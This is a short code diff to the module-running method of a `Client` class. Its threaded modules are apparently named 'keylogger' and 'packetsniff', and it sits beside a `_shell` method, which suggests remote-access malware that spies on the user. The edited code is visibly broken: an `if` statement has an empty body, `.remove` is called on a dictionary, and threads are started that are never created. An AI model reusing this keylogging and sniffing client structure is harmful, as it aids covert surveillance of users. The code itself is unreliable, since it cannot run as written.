@@ -533,17 +533,15 @@ class Client(object):
 
     def _run(self):
         for name, module in self._modules.items():
-             if module.status and sys.platform in module.platforms and name not in self._threads:
-                self._threads[name] = Thread(target=module, name=name)
+             if module.status and sys.platform in module.platforms:
+                
         for worker, task in self._threads.items():
             if not worker.is_alive():
-                try:
-                    task.run()
-                except:
-                    self._threads.remove(worker)
+                task.start()
         for worker, task in self._threads.items():
             if worker not in ('keylogger','packetsniff'):
                 task.join()
+                self._threads.remove(worker)
         return self._show(self._result)
 
     def _shell(self):
